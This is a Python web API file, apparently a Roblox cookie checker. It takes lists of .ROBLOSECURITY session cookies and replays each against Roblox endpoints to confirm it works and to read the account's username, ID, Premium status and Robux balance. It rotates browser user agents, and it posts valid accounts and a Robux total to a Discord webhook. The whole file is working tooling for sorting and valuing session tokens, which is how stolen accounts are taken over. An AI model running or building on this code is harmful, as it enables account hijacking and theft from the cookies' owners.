# api/check.py - API ROBLOX COOKIE CHECKER
from http.server import BaseHTTPRequestHandler
import json, requests, time, threading, random
from datetime import datetime, timezone

# Global state untuk kontrol
checker_state = {
    'is_checking': False,
    'current_thread': None,
    'results': [],
    'live_data': {
        'status': 'idle',
        'total_checked': 0,
        'valid': 0,
        'invalid': 0,
        'robux': 0,
        'premium': 0,
        'progress': 0,
        'current': 0,
        'total': 0,
        'start_time': None
    },
    'webhook_url': ''
}

class handler(BaseHTTPRequestHandler):
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests untuk status"""
        if self.path == '/api/check' or self.path == '/api/check?action=status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {
                'status': checker_state['live_data']['status'],
                'is_checking': checker_state['is_checking'],
                'stats': checker_state['live_data'],
                'time': datetime.now(timezone.utc).isoformat()
            }
            
            self.wfile.write(json.dumps(response).encode())
            return
        
        elif self.path == '/api/check?action=results':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            self.wfile.write(json.dumps(checker_state['results'][-50:]).encode())
            return
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests untuk kontrol"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            action = data.get('action', '')
            
            if action == 'start':
                # Start checking
                cookies = data.get('cookies', [])
                webhook_url = data.get('webhook_url', '')
                
                if not cookies:
                    raise ValueError("No cookies provided")
                
                if checker_state['is_checking']:
                    raise ValueError("Checker is already running")
                
                # Reset state
                checker_state['is_checking'] = True
                checker_state['webhook_url'] = webhook_url
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'running',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'progress': 0,
                    'current': 1,
                    'total': len(cookies),
                    'start_time': time.time()
                }
                
                # Start background thread
                thread = threading.Thread(target=check_cookies_batch, args=(cookies,))
                thread.daemon = True
                thread.start()
                checker_state['current_thread'] = thread
                
                response = {
                    'success': True,
                    'message': f'Started checking {len(cookies)} cookies',
                    'total': len(cookies)
                }
                
            elif action == 'stop':
                # Stop checking
                checker_state['is_checking'] = False
                checker_state['live_data']['status'] = 'stopped'
                
                response = {
                    'success': True,
                    'message': 'Checker stopped'
                }
                
            elif action == 'test':
                # Test single cookie
                cookie = data.get('cookie', '')
                if not cookie:
                    raise ValueError("No cookie provided")
                
                result = check_single_cookie(cookie, 0)
                response = result
                
                # Simpan hasil
                checker_state['results'].append(result)
                
                # Update stats
                if result['status'] == 'valid':
                    checker_state['live_data']['valid'] += 1
                    checker_state['live_data']['robux'] += result.get('robux', 0)
                    if result.get('premium', False):
                        checker_state['live_data']['premium'] += 1
                else:
                    checker_state['live_data']['invalid'] += 1
                
                checker_state['live_data']['total_checked'] += 1
                
            elif action == 'clear':
                # Clear results
                checker_state['results'] = []
                checker_state['live_data'] = {
                    'status': 'idle',
                    'total_checked': 0,
                    'valid': 0,
                    'invalid': 0,
                    'robux': 0,
                    'premium': 0,
                    'progress': 0,
                    'current': 0,
                    'total': 0,
                    'start_time': None
                }
                
                response = {
                    'success': True,
                    'message': 'Results cleared'
                }
                
            else:
                raise ValueError("Invalid action")
            
            # Kirim response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'success': False,
                'error': str(e)
            }).encode())

# ============================================
# FUNGSI UTILITAS
# ============================================

def check_cookies_batch(cookies):
    """Check batch cookies in background"""
    for i, cookie in enumerate(cookies):
        if not checker_state['is_checking']:
            break
        
        # Update progress
        checker_state['live_data']['current'] = i + 1
        checker_state['live_data']['progress'] = int(((i + 1) / len(cookies)) * 100)
        
        # Check cookie
        result = check_single_cookie(cookie, i)
        checker_state['results'].append(result)
        
        # Update stats
        checker_state['live_data']['total_checked'] += 1
        
        if result['status'] == 'valid':
            checker_state['live_data']['valid'] += 1
            checker_state['live_data']['robux'] += result.get('robux', 0)
            if result.get('premium', False):
                checker_state['live_data']['premium'] += 1
            
            # Kirim ke webhook jika ada
            if checker_state['webhook_url']:
                send_webhook_single(result, checker_state['webhook_url'])
        else:
            checker_state['live_data']['invalid'] += 1
        
        # Delay 1 detik
        if i < len(cookies) - 1 and checker_state['is_checking']:
            time.sleep(1)
    
    # Selesai
    if checker_state['is_checking']:
        checker_state['is_checking'] = False
        checker_state['live_data']['status'] = 'completed'
        
        # Kirim final report ke webhook
        if checker_state['webhook_url'] and checker_state['results']:
            send_webhook_final(checker_state['results'], checker_state['webhook_url'])

def check_single_cookie(cookie, cookie_id=0):
    """Check single Roblox cookie"""
    headers = {
        'User-Agent': get_random_user_agent(),
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'Accept': 'application/json'
    }
    
    result = {
        'cookie_id': cookie_id,
        'status': 'error',
        'username': 'Unknown',
        'user_id': 'Unknown',
        'display_name': 'Unknown',
        'premium': False,
        'robux': 0,
        'error': 'Unknown error',
        'timestamp': datetime.now(timezone.utc).isoformat()
    }
    
    try:
        # Cek authentication
        auth_url = "https://users.roblox.com/v1/users/authenticated"
        response = requests.get(auth_url, headers=headers, timeout=30)
        
        if response.status_code == 200:
            user_data = response.json()
            result['username'] = user_data.get('name', 'Unknown')
            result['user_id'] = str(user_data.get('id', 'Unknown'))
            result['display_name'] = user_data.get('displayName', 'Unknown')
            result['status'] = 'valid'
            result['error'] = None
            
            # Cek premium
            try:
                premium_url = "https://premiumfeatures.roblox.com/v1/users/premium/membership"
                premium_resp = requests.get(premium_url, headers=headers, timeout=10)
                if premium_resp.status_code == 200:
                    result['premium'] = premium_resp.json().get('isPremium', False)
            except:
                pass
            
            # Cek robux
            try:
                economy_url = "https://economy.roblox.com/v1/user/currency"
                economy_resp = requests.get(economy_url, headers=headers, timeout=10)
                if economy_resp.status_code == 200:
                    result['robux'] = economy_resp.json().get('robux', 0)
            except:
                pass
                
        elif response.status_code == 401:
            result['status'] = 'invalid'
            result['error'] = 'Unauthorized (Cookie expired/invalid)'
        elif response.status_code == 403:
            result['status'] = 'invalid'
            result['error'] = 'Forbidden (Security restriction)'
        elif response.status_code == 429:
            result['status'] = 'rate_limited'
            result['error'] = 'Rate limited by Roblox'
        else:
            result['status'] = 'error'
            result['error'] = f'HTTP {response.status_code}'
            
    except requests.exceptions.Timeout:
        result['status'] = 'error'
        result['error'] = 'Request timeout'
    except requests.exceptions.ConnectionError:
        result['status'] = 'error'
        result['error'] = 'Connection error'
    except Exception as e:
        result['status'] = 'error'
        result['error'] = str(e)
    
    return result

def get_random_user_agent():
    """Get random user agent"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(user_agents)

def send_webhook_single(result, webhook_url):
    """Send single result to Discord webhook"""
    try:
        if result['status'] == 'valid':
            color = 0x00ff00
            title = f"✅ VALID: {result['username']}"
            fields = [
                {"name": "💰 Robux", "value": f"`{result['robux']:,}`", "inline": True},
                {"name": "💎 Premium", "value": "✅ Yes" if result['premium'] else "❌ No", "inline": True},
                {"name": "🆔 User ID", "value": f"`{result['user_id']}`", "inline": True}
            ]
        else:
            color = 0xff0000
            title = f"❌ {result['status'].upper()}"
            fields = [
                {"name": "🚫 Error", "value": f"`{result['error']}`", "inline": False}
            ]
        
        embed = {
            "title": title,
            "color": color,
            "fields": fields,
            "footer": {"text": f"Cookie #{result['cookie_id']+1}"},
            "timestamp": result['timestamp']
        }
        
        payload = {"embeds": [embed]}
        requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass

def send_webhook_final(results, webhook_url):
    """Send final report to Discord webhook"""
    try:
        valid = len([r for r in results if r['status'] == 'valid'])
        invalid = len([r for r in results if r['status'] != 'valid'])
        total_robux = sum([r.get('robux', 0) for r in results if r['status'] == 'valid'])
        premium = len([r for r in results if r.get('premium', False)])
        
        embed = {
            "title": "📊 CHECK COMPLETED",
            "description": f"✅ **Valid:** {valid}\n❌ **Invalid:** {invalid}\n💰 **Total Robux:** {total_robux:,}\n💎 **Premium:** {premium}",
            "color": 0x3498db,
            "footer": {"text": f"Total checked: {len(results)}"}
        }
        
        payload = {"embeds": [embed]}
        requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass
